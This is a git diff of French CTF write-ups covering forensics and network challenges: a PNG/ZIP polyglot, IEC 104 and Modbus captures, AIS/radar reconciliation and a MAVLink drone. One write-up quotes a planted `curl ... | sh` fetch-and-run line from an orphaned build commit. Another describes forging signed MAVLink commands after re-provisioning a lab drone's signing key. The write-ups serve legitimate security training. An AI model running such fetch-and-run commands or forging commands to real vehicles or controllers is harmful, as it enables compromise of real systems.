+`assets/telemetry_icon.png` est un polyglotte PNG/ZIP : un chunk `tEXt` porte un tag de provenance, et le ZIP ajouté contient un fichier SQLite avec une ligne `ci_provenance_seal` *supprimée* et l'outil de scellement `assetsignd` ; l'analyse statique de cet outil donne le schéma (XOR à clé répétée avec `SHA-256(inverse(tag) ‖ epoch_le64)`) et le timestamp des commits est l'epoch → flag.
+
+#### Démarche
+
+**1. Reconnaissance — un dépôt avec un commit orphelin et une icône suspecte**
+
+J'ai travaillé sur une copie du dépôt et n'ai jamais lancé `build.sh` ni un hook. `git log --all` montre cinq commits ordinaires, tous au même timestamp (1792061626). `git fsck --lost-found --unreachable` trouve un commit inatteignable, `c435f88` « build: add telemetry opt-in check » (il est aussi dans `.git/ORIG_HEAD`) : son `build.sh` fait `curl -s http://198.51.100.9/telemetry-opt-in.sh | sh` — « l'historique de build altéré » qui a été écarté par un reset. Je n'ai pas contacté l'adresse ; c'est une diversion par rapport au marqueur.
+
+L'autre piste est l'icône ajoutée dans `92d3ba9` et référencée dans le README : `assets/telemetry_icon.png` fait 23 008 octets pour une image 10×10. `binwalk` signale un PNG, puis un ZIP à 0x72.
+
+**2. Hypothèse — un polyglotte PNG/ZIP avec un secret supprimé**
+
+En parcourant les chunks PNG à la main : `IHDR`, un chunk `tEXt` `Provenance` = `0f18e37122ddbcca` (8 octets en hexa, le « tag »), un minuscule `IDAT`, `IEND` ; puis 22 894 octets en trop qui commencent par `PK\x03\x04`. Extrait (stocké, sans compression), le ZIP a deux membres :
+
+- `telemetry_cache.db` : SQLite, table `build_secrets` avec des jetons manifestement faux (`AKIADEMOFAKE…`, `npm_fake…`) — leurres ;
+- `assetsignd` : un ELF dont l'usage est `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`.
+
+`strings` sur la base montre une ligne que `.dump` n'affiche pas : `ci_provenance_seal` suivie de 36 octets à forte entropie. Elle a été supprimée (la cellule est encore dans le corps de la page, espace non alloué) donc SQLite ne la renvoie pas. L'en-tête de l'enregistrement avant le libellé donne la longueur du blob (type sériel `0x54` → 36 octets). Un chiffré, un tag, une epoch et un outil qui prend exactement ces entrées : l'outil scelle la donnée.
+
+**3. Exploitation — inverser le scellement statiquement, puis recalculer la clé**
+
+Je n'ai pas exécuté `assetsignd`. Son désassemblage (`objdump`/`r2`) montre : les constantes SHA-256 en ligne (aucun import libcrypto), `strtoull(argv[2])` pour l'epoch, `sscanf("%02x")` pour parser le tag en octets, **une inversion des octets du tag**, l'epoch ajoutée en **8 octets little-endian**, un SHA-256 sur ce message, et enfin `out[i] = in[i] ^ digest[i & 0x1f]`. Donc :
+
+```text
+key = SHA-256( inverse(tag_bytes) || epoch_le64 );  clair[i] = chiffré[i] XOR key[i mod 32]
+```
+
+Pour l'epoch, le candidat évident est le timestamp du dépôt, 1792061626 (l'en-tête daté, l'index git et les entrées du ZIP concordent). J'ai d'abord essayé la variante `HMAC-SHA256` d'un outil similaire d'un autre challenge, sans résultat ; j'ai ensuite brute-forcé l'epoch autour de l'heure des commits contre le préfixe connu `CSCTF{` (6 octets de clé), ce qui a confirmé tout de suite le schéma SHA-256 à tag inversé pour exactement 1792061626. Déchiffrer les 36 octets donne le flag.
+
+```bash
+python3 -I solve/solve.py files/flight-telemetry-sdk
+```
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`CSCTF{...}` (masqué)
+
+#### Réflexions
+
+- Les sorties d'outils cachent les données supprimées : `.dump` et les requêtes SQLite ignorent les cellules supprimées, `strings`/hexa brut sur le fichier non.
+- Une image peut porter une archive entière après `IEND` ; parcourir les chunks et regarder les octets en trop est plus rapide que se fier à l'extension.
+- Un binaire documenté seulement par sa ligne d'usage se comprend statiquement : les constantes (table K de SHA-256), les boucles (inversion d'octets, epoch sur 8 octets) et le XOR final ont suffi, sans l'exécuter.
+- Le préfixe en clair connu `CSCTF{` transforme un paramètre incertain (l'epoch) en brute force bon marché et valide tout le schéma.
+- Le commit orphelin avec `curl | sh` est l'« histoire » du scénario, pas le marqueur : le noter sans toucher à l'adresse est la bonne manipulation.
+
+#### Outils & références
+
+- `git` (`log --all`, `fsck --lost-found`, `cat-file`), `binwalk`, `strings`, `objdump`, `radare2`
+- Python 3 (`struct`, `zipfile`, `hashlib`)
+- Structure des chunks PNG, données ajoutées à un ZIP, format d'enregistrement SQLite (types sériels)
+
+
 ### Redline
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 127 | ✅ | — | 0xAr3s-root | Chronos Security |
+| forensics | 127 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -2170,9 +2109,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Signal Reconciliation
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 51 | ✅ | — | 0xAr3s-root | — |
+| forensics | 51 | ✅ | — | non | 0xAr3s-root | — |
 
 #### Énoncé
 
@@ -2277,11 +2216,72 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Intégration trapézoïdale (navigation inertielle par estime)
 
 
+### Silent Breaker
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 81 | ✅ | — | non | 0xAr3s-root | Dan-Andrei Grigorescu |
+
+#### Énoncé
+
+> A regional substation breaker tripped without warning. You have console access to Velkarion Mobile's signaling investigation tool and a forensic bundle from the substation's IEC 60870-5-104 network. Reconstruct what happened and who is responsible.
+>
+> Endpoint: GET /events for the flagged-signaling feed; start at GET /files/ for the case-file index and report contract; submit the completed report to POST /submit.
+>
+> Flag format: `CSCTF{...}`
+
+**Fichiers fournis :** téléchargés depuis l'index `/files/` de l'instance : `README.md` (contrat du rapport), `description.md`, `roster.json`, `iec104_capture.pcap`, `hmi_monitoring.log` (non commités). Instance live `http://w01.ctf.chronos-security.ro:39328` (durée de vie 30 minutes, expirée) ; chaque lancement est un cas différent avec des données différentes.
+
+#### En bref
+
+Croiser les événements de signalisation d'un GT non légitime avec l'annuaire du personnel pour trouver l'employé ayant un accès VPN OT, lire la commande `ON` du disjoncteur (IOA, qualificatif, heure sur le fil) dans le pcap IEC 104, prendre le courant figé du run `QUALITY=SUSPECT` du journal historian, et soumettre ces cinq valeurs avec l'id de session VPN de l'employé ; le service renvoie le flag en `clearance_code`.
+
+#### Démarche
+
+**1. Reconnaissance — lire le contrat avant de toucher à la console**
+
+`GET /files/` liste les fichiers du cas et un contrat (`/files/README.md`) qui définit tout : `/events` (gratuit), `/query/subscriber` et `/query/vpn-window` (budgétés), `POST /confirm-target` (**2 tentatives**, la bonne cible débloque la route VPN) et `POST /submit` (**5 rapports complets**, réponse réussite/échec seulement). Le rapport a cinq champs : `ioa_address`, `command_qualifier`, `command_time_utc` (heure sur le fil, pas début du VPN), `telemetry_status` (courant figé du run suspect) et `vpn_session_id`. Les tentatives étant rares, chaque valeur doit être dérivée hors ligne avant de soumettre.
+
+**2. Hypothèse — quatre sources indépendantes donnent les cinq champs**
+
+- **Qui** : `/events` précise que tout GT hors `GT-0000..GT-0999` n'est pas un pair légitime. Six événements viennent de `GT-7779-Q22` (UpdateLocation / SendRoutingInfoForSM) pour six MSISDN. En les croisant avec `roster.json` : seule **Sanda Ionescu, `VLK-1944-ION`, OT Field Engineering**, a `ot_vpn_access: true` ; les autres (Finance, RH, Juridique, Service client) ne peuvent pas accéder au VPN OT. Deux requêtes `/query/subscriber` ont confirmé que les deux numéros essayés étaient sur liste de surveillance (budget 8).
+- **Ce qui a été envoyé** : dans le pcap (TCP 2404), parmi les rapports réguliers `M_ME_NC_1` (type 13, IOA `0x21fb`), une trame va dans l'autre sens, maître → RTU, à 08:55:36 UTC : `68 0e … 2d 01 06 00 01 00 fb 21 00 01` = type 45 `C_SC_NA_1` (commande simple), COT 6 (activation), octets IOA `fb 21 00` = **0x21fb**, SCO `01` = **ON** ; le RTU répond avec COT 7 (confirmation d'activation) à la même seconde. L'heure de commande est donc **08:55** (le rapport veut `HH:MM`).
+- **Courant falsifié** : `hmi_monitoring.log` montre des lectures normales d'environ 452–455 A (±1,5 A), puis dès 08:54:40 une valeur constante **426,0 A** que l'historian marque `QUALITY=SUSPECT` de 08:55:00 à 08:57:30 (les deux premières lectures identiques restent `GOOD` car la règle exige trois). Sur le fil, les lectures propres du RTU continuent de varier et reviennent vers 453 A : 426,0 A est donc un enregistrement figé/rejoué de l'historian, pas une valeur live : `telemetry_status = 426.0`.
+- **Quelle session** : donnée seulement après un `/confirm-target` correct.
+
+**3. Exploitation — confirmer la cible, obtenir la session, soumettre**
+
+```bash
+python3 -I solve/solve.py http://<cible>            # dérive et affiche le rapport (GET seulement)
+python3 -I solve/solve.py http://<cible> --submit   # confirm-target + vpn-window + submit
+```
+
+`/confirm-target {"employee_id":"VLK-1944-ION"}` a renvoyé `confirmed`, et `/query/vpn-window` a listé cinq sessions ; celle de `VLK-1944-ION` est `VPN-914973` (Access-Accept à 08:21:41 avec un challenge OTP, IP source `203.0.113.197`). C'est une session différente de celles ouvertes à 08:55 ou plus tard par d'autres utilisateurs, qui sont des leurres rapprochés de la commande. Le premier rapport complet a été accepté (4 tentatives restantes) et a renvoyé le flag.
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`CSCTF{...}` (masqué)
+
+#### Réflexions
+
+- Lire le contrat d'abord : avec 2 et 5 tentatives, dériver les réponses hors ligne depuis les preuves est tout le jeu ; aucune devinette n'a été nécessaire.
+- Ne pas prendre la session VPN qui commence au plus près de la commande ; le rapport demande la session de l'employé compromis, dont le début est antérieur (l'énoncé dit « heure sur le fil de la commande, pas début de session VPN »).
+- Un marqueur `SUSPECT` côté historian vit dans le journal, pas sur le fil : le pcap montre que le RTU a continué à remonter des valeurs live, ce qui prouve que les 426,0 A affichés étaient figés.
+- Le script dérive chaque champ des fichiers de l'instance, car un relancement donne un nouveau cas.
+
+#### Outils & références
+
+- `curl`, `tshark` (pour lister les trames), Python 3 (`urllib`, `struct`, parsing pcap maison)
+- ASDU IEC 60870-5-104 / IEC 60870-5-101 : types 13 (`M_ME_NC_1`) et 45 (`C_SC_NA_1`), causes de transmission 6/7
+
+
 ### Tone Burst
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 113 | ✅ | — | 0xAr3s-root | Chronos Security |
+| forensics | 113 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -2336,51 +2336,54 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ## Réseau
 
-### Grid Watch
+### Dark Anchorage Reconciliation
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| network | 672 | 75 | ✅ | — | 0xAr3s-root | Marius Merai |
+| network | 101 | ✅ | — | oui | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
-> Vultur Dynamics drones patrol the RGN-Grid high-voltage network. An adversary wants one diverted off its corridor. You have a packet capture of a drone's MAVLink 2 command link and live access to the drone itself. Make the drone accept your own reposition command. Unsigned and replayed commands are refused — the flag returns only from a command the drone actually accepts.
+> Kaldura, an Operation Dawn ally, carries coalition traffic over the KALNET-1 cable, and KALNET-1 failed just as a hostile maritime operation was expected near the cable corridor. AIS says no suspicious vessel crossed the fault envelope, yet coastal radar recorded anonymous contacts on a different clock.
 >
-> Interact only with your assigned instance.
+> Produce the complete sensor-reconciliation report that identifies the false broadcast, quantifies the displacement and establishes the actual closest approach. Read `GET /schema` for the report format. The four evidence files are `GET /files/ais.ndjson`, `GET /files/radar.csv`, `GET /files/cable-fault.txt` and `GET /files/method-note.txt`. Submit one complete report to `POST /reconcile`; a correct report returns the reconciliation code.
 >
 > Flag format: `CSCTF{...}`
 
-**Fichiers fournis :** `files/capture.tlog`, `files/provisioning_note.md` (non commités). Instance live : TCP `w02.ctf.chronos-security.ro:32773` (expirée).
+Indice : *Normalize the declared radar clock, then score every radar/AIS association across its whole paired trajectory, not at one point near the cable.*
+
+**Fichiers fournis :** instance live uniquement (`http://<cible>:<port>/`, expirée) ; les quatre fichiers de preuve sont servis par celle-ci.
 
 #### En bref
 
-Le drone n'accepte que des commandes signées MAVLink 2, avec une horloge custom : calibrer la RTC depuis la capture (+17 ppm, époque de commissioning 1733965123) permet de dériver la clé de provisioning par HKDF depuis le nonce par connexion, de re-provisionner ma propre clé de signature avec `SETUP_SIGNING`, puis — signés avec cette clé — passer GUIDED, armer et envoyer `DO_REPOSITION`, qui renvoie le flag.
+Soustraire le décalage de l'en-tête radar (180 min) pour apparier radar et AIS, associer les 16 pistes par résidu médian, repérer la seule piste AIS qui dérive de (330, 330) m sur 4 échantillons, calculer le CPA radar-seul au point du câble, puis POSTer le rapport — le plus dur est le format JSON non documenté, où le vecteur doit être deux membres séparés.
 
 #### Démarche
 
-**1. Reconnaissance — un lien signé, un problème de calibration et une backdoor à clé dérivée**
+**1. Reconnaissance — la note de méthode est la spec**
 
-`capture.tlog` contient 24 paquets MAVLink 2 signés (GCS 255/190 ↔ drone 1/1, link_id 249) : heartbeats, `STATUSTEXT` annonçant le serial `CX-FALCON-9951`, un `COMMAND_LONG 511`, des rapports `GLOBAL_POSITION_INT`. Chaque paquet porte une signature de 13 octets (link_id, timestamp 48 bits en ticks de 10 µs, SHA256-48), donc rejouer la capture est inutile : les timestamps sont vérifiés et la clé de session n'est pas dans la capture.
+`method-note.txt` donne tout l'algorithme : `local_time` radar = UTC + décalage d'en-tête (`# radar_utc_offset_minutes=180`), appariement des échantillons UTC normalisés égaux, plan local autour du point du câble (`est=R·cos(lat0)·Δlon`, `nord=R·Δlat`, R=6378137), score par résidu médian, plus longue série ≥4 échantillons avec résidu ≥250 m et pas ≤15 m par composante pour la divergence, CPA de segment radar seul avec projection bornée. `/schema` liste les noms de membres et les tolérances (3 m, 2 s) mais **aucun exemple de corps**.
 
-`provisioning_note.md` est la voie d'entrée : les clés peuvent être re-provisionnées avec `SETUP_SIGNING`, authentifié par `prov_key = HKDF-SHA256(ikm = serial_ascii || commissioning_epoch_le64, salt = session_nonce, info = "CX-PROV/v1", L = 32)`. Le serial est connu ; le nonce est annoncé à la connexion (`PROV NONCE …`) ; ce qui manque est l'époque de commissioning — et tout timestamp que je signe doit correspondre à la RTC particulière du drone (ticks depuis l'époque de commissioning, *pas* l'époque MAVLink 2015, avec un offset et une dérive ppm par unité à calibrer).
+**2. Hypothèse — une bijection complète à score quasi nul, et un menteur**
 
-**2. Hypothèse — les deux horloges de la capture donnent l'époque et la dérive**
+Avec le décalage soustrait, chaque piste R-01..R-16 correspond à un seul MMSI AIS avec un résidu médian de 0 m (les mauvaises paires sont ≥180 m : aucune ambiguïté). Les résidus par échantillon, plutôt que la médiane, révèlent le menteur : R-03 / MMSI `979103829` est à 466,7 m — exactement (330 m E, 330 m N) — à 10:26, 10:28, 10:30 et 10:32 UTC. Le CPA radar-seul sur tous les segments est R-03 elle-même, qui passe par le point du câble sur le segment 10:30→10:32 à u≈0,818.
 
-Chaque enregistrement tlog a un timestamp hôte (µs), et chaque paquet un timestamp de signature. En les appariant : les timestamps de signature croissent de 3 100 052–3 100 053 ticks par 31,000000 s de temps hôte, une pente constante de **100001,7 ticks/s = +17 ppm**. Avec cette pente, `signing_ticks = round((unix_time − E)·100001,7)` fitte les 24 paquets à un demi-tick près pour **E = 1733965123** (2024-12-12 00:58:43 UTC) et un offset supplémentaire nul. J'ai validé le modèle en live avant de l'utiliser : les timestamps de signature prédits encadraient ceux des propres signatures du drone à la connexion (avant/après l'aller-retour). Cela fixe à la fois l'entrée époque de HKDF et l'horloge de chaque paquet que je forge.
+**3. Exploitation — faire accepter le rapport**
 
-Les messages d'erreur du drone ont ensuite cartographié le reste du protocole : un `SETUP_SIGNING` non signé → `REJECT: unsigned message` ; un message `SET_MODE` → `REJECT: not a command for this drone` (il ne prend que des `COMMAND_LONG`) ; armer avant GUIDED → `REJECT: must be in GUIDED before arming` ; la commande 512 → `REJECT: unexpected command 512`, tandis que **192 est son `DO_REPOSITION`** (`REJECT: DO_REPOSITION requires GUIDED + ARMED`). Donc l'ordre de vol de la note — GUIDED, armement, commande — est appliqué littéralement.
+`POST /reconcile` répondait `400 invalid report` à tout, sans indice (une erreur sémantique donnerait `422 report not accepted`). Le passage 400 → 422 sert d'oracle : j'ai balayé ~350 formes (associations en objets/chaînes/dictionnaire, intervalle en deux clés ou liste, vecteur en liste/objet, décalage en chaîne, enveloppes) jusqu'à obtenir un 422. La forme acceptée :
 
-**3. Exploitation — re-provisionner, puis voler l'ordre normal, le tout sur une seule connexion**
+```json
+{"version":"KALNET-RECON-1","radar_utc_offset_minutes":180,
+ "associations":[{"radar_track":"R-01","mmsi":"<9 chiffres>"}, "... x16"],
+ "divergence":{"mmsi":"<9 chiffres>","start_utc":"...Z","end_utc":"...Z",
+               "ais_minus_radar_east_m":330,"ais_minus_radar_north_m":330},
+ "closest_approach":{"mmsi":"<9 chiffres>","utc":"...Z","distance_m":0.0}}
+```
 
-Le nonce est par connexion, donc tout se passe sur une seule connexion TCP, chaque paquet signé avec `SHA256-48(key ‖ packet ‖ link_id ‖ timestamp)` et un timestamp RTC frais et strictement croissant :
-
-1. Lire `PROV NONCE`, calculer `prov_key` par HKDF (salt = le nonce en octets bruts depuis l'hex).
-2. `SETUP_SIGNING` (msg 256) : une nouvelle clé de session de mon choix (le script utilise `SHA256("gridwatch-session-key-v1")`, n'importe quels 32 octets fonctionnent), `initial_timestamp` = son propre timestamp de signature, paquet signé avec `prov_key` → `signing re-provisioned: new key active`.
-3. Signés avec la nouvelle clé : `COMMAND_LONG 176` (`DO_SET_MODE`, param1=1, param2=4) → `mode GUIDED` ; `COMMAND_LONG 400` (armement, param1=1) → `ARMED` ; `COMMAND_LONG 192` (`DO_REPOSITION`, param5/6/7 = 45,6 / 24,1 / 100) → `COMMAND_ACK` plus un `STATUSTEXT` portant le flag.
+Le 422 restant venait de mon propre bug : j'avais converti l'heure du CPA avec `datetime.timestamp()` sur une date naïve, ce qui la décalait du fuseau local (09:31:38 au lieu de 10:31:38). Avec `calendar.timegm`, le serveur a renvoyé le flag.
 
 ```bash
-pip install pymavlink
-python3 solve/solve.py w02.ctf.chronos-security.ro 32773
+python3 solve/solve.py http://<cible>:<port> --post
 ```
 
 Script de résolution : `solve/solve.py` (voir l'annexe)
@@ -2389,24 +2392,23 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 `CSCTF{...}` (masqué)
 
-#### Ce que j'ai appris
+#### Réflexions
 
-- La capture n'est pas là pour être rejouée mais pour être *mesurée* : deux timestamps par paquet suffisent à retrouver exactement l'époque et la dérive ppm de la RTC (résidus sous le demi-tick sur 24 paquets).
-- J'ai vérifié le modèle d'horloge contre le drone live avant d'envoyer quoi que ce soit de forgé — une mauvaise époque casse aussi l'entrée de HKDF, donc ce seul fit débloque à la fois la clé et les timestamps.
-- Les messages de rejet du serveur sont une spécification : chaque sonde refusée (`SET_MODE`, 512, armement trop tôt) a levé une inconnue, laissant 176 → 400 → 192 comme seul ordre accepté.
-- Tout doit partager une seule connexion car le salt de HKDF (le nonce) est annoncé par connexion.
+- Quand une API ne donne aucun exemple, les codes de statut sont l'oracle : le passage 400 → 422 prouve que la *structure* est bonne avant que les *valeurs* soient vérifiées. Balayer les formes avec un pool de threads et n'afficher que les réponses non-400.
+- Ne pas se fier à une validation qui échoue à la fois sur la structure et les valeurs : après avoir trouvé la forme, un second bug (fuseau horaire) restait caché. Vérifier les valeurs dérivées contre les données (l'heure du CPA devait tomber dans le segment 10:30–10:32, pas 09:31).
+- Toujours utiliser des fonctions de temps explicites en UTC (`calendar.timegm`, `timezone.utc`) ; `timestamp()` sur une date naïve utilise silencieusement le fuseau de la machine.
 
-#### Outils et références
+#### Outils & références
 
-- Python 3 + pymavlink (dialecte common, packing des messages / CRC extras), `hashlib`/`hmac` pour HKDF-SHA256 et les signatures SHA256-48
-- Signature de paquets MAVLink 2 et `SETUP_SIGNING` (message 256), commandes `COMMAND_LONG` 176 / 400 / 192
+- Python 3 (`urllib`, `csv`, `statistics`, `concurrent.futures`), `curl`
+- Projection locale tangente, formule de CPA de segment tirée de `method-note.txt`
 
 
 ### Ghost Signal
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| network | 587 | 145 | ✅ | — | 0xAr3s-root | Dragoş Bacitea |
+| network | 145 | ✅ | — | oui | 0xAr3s-root | Dragoş Bacitea |
 
 #### Énoncé
 
@@ -2475,117 +2477,51 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - GSM MAP (`sendRoutingInfo`, `sendRoutingInfoForSM`, `updateLocation`) sur SS7/M3UA ; AVP Diameter Session-Id / Subscription-Id-Data (échanges de style 3GPP Cx/Ro)
 
 
-### Water Hammer Reconciliation
+### Grid Watch
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| network | 326 | 124 | ✅ | — | 0xAr3s-root | Cosmin Gorea |
+| network | 75 | ✅ | — | non | 0xAr3s-root | Marius Merai |
 
 #### Énoncé
 
-> The Vardessa Civil Water Reserve header was isolated after a hostile engineering-station interval, part of a wider campaign against emergency water logistics that coalition analysts tie to an Ash Army proxy. Vardessa is an Operation Dawn partner.
+> Vultur Dynamics drones patrol the RGN-Grid high-voltage network. An adversary wants one diverted off its corridor. You have a packet capture of a drone's MAVLink 2 command link and live access to the drone itself. Make the drone accept your own reposition command. Unsigned and replayed commands are refused — the flag returns only from a command the drone actually accepts.
 >
-> Reconstruct the complete confirmed Modbus/TCP control history and submit the reconciliation identifier the evidence supports. `water-hammer-reconciliation.zip` holds all three evidence files: the capture `reserve-header.pcapng`, `station-profile.txt` and `capture-manifest.txt`. `station-profile.txt` defines the scoped conversation, the confirmation rule, the safety screen, the report grammar and the submission encoding; `capture-manifest.txt` identifies the evidence and its provenance. No live plant, external service or credential is involved.
->
-> The capture holds ordinary reads, one exception and one unanswered write. A write acknowledgement on its own is not a confirmed control snapshot, so follow the profile's matched-readback rule.
->
-> Flag format: `CSCTF{message}`
-
-**Fichiers fournis :** `files/reserve-header.pcapng`, `files/station-profile.txt`, `files/capture-manifest.txt` (non commités).
-
-#### En bref
-
-Réassembler l'unique conversation Modbus/TCP, ne garder que les écritures FC16 dont l'écho normal unique est suivi du readback FC3 exact avec une réponse unique appariée (64 instantanés), les sérialiser dans le rapport canonique avec le masque d'insécurité en entiers, en SHA-256, puis encoder les 24 premiers octets en Base32 → flag.
-
-#### Démarche
-
-**1. Reconnaissance — le profil est la spécification**
-
-`station-profile.txt` fixe tout : la conversation ciblée (`192.0.2.10:<éphémère>` → `192.0.2.20:502`, unit 17), la grammaire MBAP stricte (protocol id 0, Length = 1 + PDU, ni troncature ni octets en trop), la carte des registres (0x1000 consigne pompe, 0x1001 ouverture vanne en pour-mille, 0x1002 armé, 0x1003 rampe en µs), la règle de confirmation, un filtre de sécurité en entiers (E, V, Q avec `T_US = 37558`), le texte exact du rapport `R` et l'encodage (`SHA-256(R)` → 24 premiers octets → Base32 sans padding → 39 caractères), plus un vecteur de test synthétique public. `capture-manifest.txt` ne donne que la provenance et le SHA-256 de la capture, qui correspond (`6af88183…`).
-
-La capture est une seule conversation TCP (port client 36853) de 536 trames, 2 190 octets client et 1 933 octets serveur. Les frontières de segments n'ont pas d'importance : certains ADU sont coupés sur plusieurs segments, j'ai donc réassemblé chaque sens par numéro de séquence TCP et délimité les flux d'octets avec la longueur MBAP. Codes fonction côté client : 68 FC3 et 66 FC16 ; côté serveur : 68 FC3, 64 réponses FC16 normales et une exception FC16 (`0x90`, code 04).
-
-**2. Hypothèse — un instantané demande quatre choses, dans l'ordre**
-
-Une écriture ne compte que si : (1) la requête FC16 est un candidat valide (unit 17, départ/quantité dans 0x1000–0x1003, Length `7 + 2N`, byte count `2N`) ; (2) exactement une réponse normale de même transaction id revient avec l'écho exact `10 || A || N` (l'exception, une requête sans réponse et tout écho dupliqué ou discordant ne confirment jamais) ; (3) l'ADU client immédiatement suivant cette réponse est exactement `FC3 1000 0004` (unit 17, Length 6) ; et (4) sa réponse est unique, de Length 11 avec `03 08` + 8 octets. Les valeurs des lignes sont les **registres du readback FC3**, pas les données écrites, et le `tid` du rapport est l'identifiant de transaction de la **réponse FC16** (ici `2000`, `2011`, `2022`… alors que les identifiants FC3 ressemblent à `8000`, `8013`…). Les instantanés sont ordonnés par l'ordinal de trame de la réponse FC16.
-
-Leurres à écarter : les lectures FC3 initiales inoffensives (`e010`, `e011`), l'exception FC16 (`e100`), et la dernière requête FC16 sans réponse. Le résultat est exactement les 64 instantanés annoncés par le profil.
-
-**3. Exploitation — sérialiser et hacher**
-
-Avec le tuple initial (80, 500, 0, 60000) : `E = P·G/1000`, `V = E·10⁶/70686` (parties entières), `Q = 998·1065·|V − V_préc|`, `UNSAFE = A=1 ∧ R < 37558 ∧ Q > 9000·10⁵` ; le masque est `Σ UNSAFE_i · 2^(63−i)` sur 16 chiffres hexa majuscules. J'ai d'abord vérifié mes formules sur le vecteur de test public (V₋₁ = 565, ligne 0 : E=160, V=2263, Q=1804753260, masque `8000…`, SHA-256 `401df824…`, Base32 `IAO7QJHG…`) : tout correspond exactement. Sur les vraies données, les 64 lignes sont toutes armées, sous le seuil de rampe et avec un changement de vitesse (les contrôles de « l'intervalle d'attaque »), 22 dépassent la limite de Q, et le masque est `D3FC7C00A3060000`. Le rapport canonique est haché et les 24 premiers octets encodés en Base32 (39 caractères).
-
-```bash
-python3 -I solve/solve.py files
-```
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`CSCTF{...}` (masqué)
-
-#### Réflexions
-
-- Quand l'énoncé fournit une spécification et un vecteur de test, implémenter d'abord le vecteur : le retrouver à l'octet près (Base32 compris) élimine des classes entières de doutes d'erreur d'un cran et d'encodage avant de toucher aux vraies données.
-- Réassembler les flux TCP avant de parser : une lecture paquet par paquet couperait ou fusionnerait des ADU, et le profil dit explicitement que les frontières de segments ne créent aucun événement.
-- « Readback apparié » signifie que le rapport utilise la relecture de l'équipement, pas la commande ; et l'identifiant à sérialiser est le tid de la *réponse* FC16, un détail facile à rater.
-- Toute l'arithmétique est restée en entiers Python : Q atteint environ 2,4·10⁹, au-delà de l'entier signé 32 bits.
-
-#### Outils & références
-
-- `tshark` (vue d'ensemble des conversations), Python 3 (`struct`, `hashlib`, `base64` ; pcapng et réassemblage TCP maison)
-- Modbus Application Protocol v1.1b3 (FC3, FC16, exceptions), en-tête MBAP Modbus/TCP, RFC 4648 Base32
-
-
-### Dark Anchorage Reconciliation
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| network | 302 | 101 | ✅ | — | 0xAr3s-root | Chronos Security |
-
-#### Énoncé
-
-> Kaldura, an Operation Dawn ally, carries coalition traffic over the KALNET-1 cable, and KALNET-1 failed just as a hostile maritime operation was expected near the cable corridor. AIS says no suspicious vessel crossed the fault envelope, yet coastal radar recorded anonymous contacts on a different clock.
->
-> Produce the complete sensor-reconciliation report that identifies the false broadcast, quantifies the displacement and establishes the actual closest approach. Read `GET /schema` for the report format. The four evidence files are `GET /files/ais.ndjson`, `GET /files/radar.csv`, `GET /files/cable-fault.txt` and `GET /files/method-note.txt`. Submit one complete report to `POST /reconcile`; a correct report returns the reconciliation code.
+> Interact only with your assigned instance.
 >
 > Flag format: `CSCTF{...}`
 
-Indice : *Normalize the declared radar clock, then score every radar/AIS association across its whole paired trajectory, not at one point near the cable.*
-
-**Fichiers fournis :** instance live uniquement (`http://<cible>:<port>/`, expirée) ; les quatre fichiers de preuve sont servis par celle-ci.
+**Fichiers fournis :** `files/capture.tlog`, `files/provisioning_note.md` (non commités). Instance live : TCP `w02.ctf.chronos-security.ro:32773` (expirée).
 
 #### En bref
 
-Soustraire le décalage de l'en-tête radar (180 min) pour apparier radar et AIS, associer les 16 pistes par résidu médian, repérer la seule piste AIS qui dérive de (330, 330) m sur 4 échantillons, calculer le CPA radar-seul au point du câble, puis POSTer le rapport — le plus dur est le format JSON non documenté, où le vecteur doit être deux membres séparés.
+Le drone n'accepte que des commandes signées MAVLink 2, avec une horloge custom : calibrer la RTC depuis la capture (+17 ppm, époque de commissioning 1733965123) permet de dériver la clé de provisioning par HKDF depuis le nonce par connexion, de re-provisionner ma propre clé de signature avec `SETUP_SIGNING`, puis — signés avec cette clé — passer GUIDED, armer et envoyer `DO_REPOSITION`, qui renvoie le flag.
 
 #### Démarche
 
-**1. Reconnaissance — la note de méthode est la spec**
+**1. Reconnaissance — un lien signé, un problème de calibration et une backdoor à clé dérivée**
 
